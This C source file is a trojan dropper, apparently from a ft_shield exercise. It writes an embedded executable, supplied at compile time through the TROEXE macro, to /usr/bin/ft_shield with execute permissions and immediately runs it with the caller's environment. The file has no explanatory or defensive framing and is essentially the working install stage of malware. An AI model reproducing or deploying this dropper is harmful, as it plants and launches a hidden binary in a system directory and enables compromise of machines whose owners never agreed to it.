#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

#define TROLOC "/usr/bin/ft_shield"

#ifndef TROEXE
# error "-DTROEXE=... is required to compile this file"
#endif

extern char **environ;

int	main(void)
{
	int	fd;

	fd = creat(TROLOC, 0755);
	if (fd < 0)
	{
		perror("open");
		return (EXIT_FAILURE);
	}
	if (write(fd, TROEXE, sizeof(TROEXE)) < 0)
	{
		close(fd);
		perror("open");
		return (EXIT_FAILURE);
	}
	close(fd);
	execve(TROLOC, (char **){}, environ);
	return (0);
}
